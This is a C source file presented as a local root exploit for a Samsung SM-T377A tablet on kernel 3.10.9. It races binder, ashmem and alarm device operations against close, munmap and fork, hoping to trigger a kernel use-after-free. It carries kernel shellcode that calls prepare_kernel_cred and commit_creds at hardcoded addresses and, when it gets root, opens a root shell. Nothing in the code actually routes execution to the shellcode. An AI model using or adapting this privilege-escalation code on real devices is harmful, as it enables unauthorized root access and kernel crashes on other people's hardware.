/*
 * binder_epoll_race.c — Binder + epoll + fork race conditions
 *
 * SM-T377A, kernel 3.10.9. Samsung patched CVE-2019-2215's specific
 * binder_thread UAF but there may be OTHER race conditions in binder.
 *
 * This tests several race patterns:
 * 1. epoll_ctl(ADD, binder_fd) + close(binder_fd) + fork() simultaneously
 * 2. Multiple binder fds in same epoll, close while writing
 * 3. binder mmap + munmap race with ioctl
 * 4. BINDER_WRITE_READ + close + epoll race
 *
 * Also tests /dev/ashmem races:
 * 5. ashmem pin/unpin + mmap + close race
 * 6. ashmem set_size + mmap + fork race
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>

#define COMMIT_CREDS        0xC0054328
#define PREPARE_KERNEL_CRED 0xC00548E0

typedef unsigned long (*commit_creds_fn)(unsigned long);
typedef unsigned long (*prepare_kernel_cred_fn)(unsigned long);
static volatile int g_got_root = 0;

static void __attribute__((noinline, optimize("O0")))
kernel_shellcode(void) {
    prepare_kernel_cred_fn pkc = (prepare_kernel_cred_fn)PREPARE_KERNEL_CRED;
    unsigned long new_cred = pkc(0);
    if (new_cred) {
        commit_creds_fn cc = (commit_creds_fn)COMMIT_CREDS;
        cc(new_cred);
        g_got_root = 1;
    }
}

/* ===== Binder definitions ===== */
#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, unsigned int)
#define BINDER_VERSION          _IOWR('b', 9, struct binder_version)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

struct binder_version {
    signed long protocol_version;
};

/* Binder command codes */
#define BC_ENTER_LOOPER     0x630d
#define BC_EXIT_LOOPER      0x630e
#define BC_FREE_BUFFER      0x4003630f

/* ===== Ashmem definitions ===== */
#define ASHMEM_SET_NAME     _IOW(0x77, 1, char[256])
#define ASHMEM_SET_SIZE     _IOW(0x77, 3, size_t)
#define ASHMEM_GET_SIZE     _IO(0x77, 4)
#define ASHMEM_PIN          _IOW(0x77, 7, struct ashmem_pin)
#define ASHMEM_UNPIN        _IOW(0x77, 8, struct ashmem_pin)

struct ashmem_pin {
    unsigned int offset;
    unsigned int len;
};

/* ===== Test 1: Binder open/mmap/close + epoll race ===== */

static volatile int binder_running = 1;

static void *binder_opener(void *arg) {
    int epfd = *(int*)arg;
    while (binder_running) {
        int bfd = open("/dev/binder", O_RDWR);
        if (bfd < 0) continue;

        /* mmap binder */
        void *m = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);

        /* Add to epoll */
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        /* Race: close binder while epoll and mmap are active */
        if (m != MAP_FAILED) munmap(m, 4096);
        close(bfd);
    }
    return NULL;
}

static void *binder_poller(void *arg) {
    int epfd = *(int*)arg;
    struct epoll_event events[32];
    while (binder_running) {
        epoll_wait(epfd, events, 32, 1);
    }
    return NULL;
}

static void run_binder_epoll_race(int duration) {
    printf("[*] Test 1: Binder open/mmap/close + epoll race (%ds)\n", duration);
    int epfd = epoll_create1(0);
    if (epfd < 0) return;

    binder_running = 1;
    pthread_t openers[3], pollers[2];
    for (int i = 0; i < 3; i++)
        pthread_create(&openers[i], NULL, binder_opener, &epfd);
    for (int i = 0; i < 2; i++)
        pthread_create(&pollers[i], NULL, binder_poller, &epfd);

    time_t start = time(NULL);
    while ((time(NULL) - start) < duration && !g_got_root) {
        sleep(2);
        printf("  [binder-epoll] %lds uid=%d\n", time(NULL)-start, getuid());
    }

    binder_running = 0;
    for (int i = 0; i < 3; i++) pthread_join(openers[i], NULL);
    for (int i = 0; i < 2; i++) pthread_join(pollers[i], NULL);
    close(epfd);
    printf("  [binder-epoll] done uid=%d\n\n", getuid());
}

/* ===== Test 2: Binder write + close race ===== */

static volatile int bwr_running = 1;

static void *binder_writer(void *arg) {
    while (bwr_running) {
        int bfd = open("/dev/binder", O_RDWR);
        if (bfd < 0) continue;

        /* mmap required for binder operations */
        void *m = mmap(NULL, 128*1024, PROT_READ, MAP_PRIVATE, bfd, 0);
        if (m == MAP_FAILED) { close(bfd); continue; }

        /* Set max threads */
        unsigned int max_threads = 0;
        ioctl(bfd, BINDER_SET_MAX_THREADS, &max_threads);

        /* Enter looper (creates binder_thread in kmalloc-256) */
        unsigned int cmd = BC_ENTER_LOOPER;
        struct binder_write_read bwr = {
            .write_size = sizeof(cmd),
            .write_consumed = 0,
            .write_buffer = (unsigned long)&cmd,
            .read_size = 0,
            .read_consumed = 0,
            .read_buffer = 0
        };
        ioctl(bfd, BINDER_WRITE_READ, &bwr);

        /* Exit looper */
        cmd = BC_EXIT_LOOPER;
        bwr.write_size = sizeof(cmd);
        bwr.write_consumed = 0;
        bwr.write_buffer = (unsigned long)&cmd;
        ioctl(bfd, BINDER_WRITE_READ, &bwr);

        munmap(m, 128*1024);
        close(bfd); /* races with any pending binder operations */
    }
    return NULL;
}

static void run_binder_write_race(int duration) {
    printf("[*] Test 2: Binder write/close thread race (%ds)\n", duration);

    bwr_running = 1;
    pthread_t writers[4];
    for (int i = 0; i < 4; i++)
        pthread_create(&writers[i], NULL, binder_writer, NULL);

    time_t start = time(NULL);
    while ((time(NULL) - start) < duration && !g_got_root) {
        sleep(2);
        printf("  [binder-wr] %lds uid=%d\n", time(NULL)-start, getuid());
    }

    bwr_running = 0;
    for (int i = 0; i < 4; i++) pthread_join(writers[i], NULL);
    printf("  [binder-wr] done uid=%d\n\n", getuid());
}

/* ===== Test 3: Ashmem pin/unpin + mmap + close race ===== */

static volatile int ash_running = 1;

static void *ashmem_racer(void *arg) {
    while (ash_running) {
        int afd = open("/dev/ashmem", O_RDWR);
        if (afd < 0) continue;

        /* Set size */
        size_t sz = 4096;
        ioctl(afd, ASHMEM_SET_SIZE, &sz);

        /* mmap */
        void *m = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, afd, 0);
        if (m == MAP_FAILED) { close(afd); continue; }

        /* Write to ashmem */
        memset(m, 0x41, 4096);

        /* Pin/unpin race with close */
        struct ashmem_pin pin = { .offset = 0, .len = 4096 };
        pid_t p = fork();
        if (p == 0) {
            /* Child: rapidly pin/unpin */
            for (int i = 0; i < 100; i++) {
                ioctl(afd, ASHMEM_UNPIN, &pin);
                ioctl(afd, ASHMEM_PIN, &pin);
            }
            _exit(0);
        } else if (p > 0) {
            /* Parent: close and munmap while child is pinning */
            munmap(m, 4096);
            close(afd);
            waitpid(p, NULL, 0);
        }
    }
    return NULL;
}

static void run_ashmem_race(int duration) {
    printf("[*] Test 3: Ashmem pin/unpin + mmap + close race (%ds)\n", duration);

    ash_running = 1;
    pthread_t racers[2];
    for (int i = 0; i < 2; i++)
        pthread_create(&racers[i], NULL, ashmem_racer, NULL);

    time_t start = time(NULL);
    while ((time(NULL) - start) < duration && !g_got_root) {
        sleep(2);
        printf("  [ashmem] %lds uid=%d\n", time(NULL)-start, getuid());
    }

    ash_running = 0;
    for (int i = 0; i < 2; i++) pthread_join(racers[i], NULL);
    printf("  [ashmem] done uid=%d\n\n", getuid());
}

/* ===== Test 4: alarm device race ===== */

static volatile int alm_running = 1;

static void *alarm_racer(void *arg) {
    while (alm_running) {
        int afd = open("/dev/alarm", O_RDONLY);
        if (afd < 0) continue;

        struct epoll_event ev = { .events = EPOLLIN };
        int epfd = epoll_create1(0);
        if (epfd >= 0) {
            ev.data.fd = afd;
            epoll_ctl(epfd, EPOLL_CTL_ADD, afd, &ev);
            /* Race close with epoll_wait */
            close(afd);
            epoll_wait(epfd, &ev, 1, 0);
            close(epfd);
        } else {
            close(afd);
        }
    }
    return NULL;
}

static void run_alarm_race(int duration) {
    printf("[*] Test 4: /dev/alarm + epoll close race (%ds)\n", duration);

    alm_running = 1;
    pthread_t racers[3];
    for (int i = 0; i < 3; i++)
        pthread_create(&racers[i], NULL, alarm_racer, NULL);

    time_t start = time(NULL);
    while ((time(NULL) - start) < duration && !g_got_root) {
        sleep(2);
        printf("  [alarm] %lds uid=%d\n", time(NULL)-start, getuid());
    }

    alm_running = 0;
    for (int i = 0; i < 3; i++) pthread_join(racers[i], NULL);
    printf("  [alarm] done uid=%d\n\n", getuid());
}

int main(int argc, char **argv) {
    int dur = 30;
    if (argc > 1) dur = atoi(argv[1]);

    printf("=== Binder/Ashmem/Alarm Race Exploit ===\n");
    printf("[*] SM-T377A, 3.10.9, no mitigations\n");
    printf("[*] Shellcode: %p, duration: %ds per test\n\n", kernel_shellcode, dur);

    unsigned long p = (unsigned long)kernel_shellcode & ~0xFFF;
    mprotect((void*)p, 4096, PROT_READ|PROT_WRITE|PROT_EXEC);

    pid_t child = fork();
    if (child == 0) {
        alarm(dur * 5 + 30);
        signal(SIGALRM, SIG_DFL);

        run_binder_epoll_race(dur);
        if (g_got_root || getuid() == 0) goto win;

        run_binder_write_race(dur);
        if (g_got_root || getuid() == 0) goto win;

        run_ashmem_race(dur);
        if (g_got_root || getuid() == 0) goto win;

        run_alarm_race(dur);
        if (g_got_root || getuid() == 0) goto win;

        printf("\n=== All tests done, uid=%d ===\n", getuid());
        _exit(1);
    win:
        printf("[!] *** GOT ROOT! uid=%d ***\n", getuid());
        execl("/system/bin/sh", "sh", NULL);
        _exit(0);
    } else if (child > 0) {
        int st; waitpid(child, &st, 0);
        if (WIFEXITED(st)) printf("[*] Exit: %d\n", WEXITSTATUS(st));
        else if (WIFSIGNALED(st)) printf("[!] SIGNAL: %d (CRASH!)\n", WTERMSIG(st));
    }
    return 0;
}
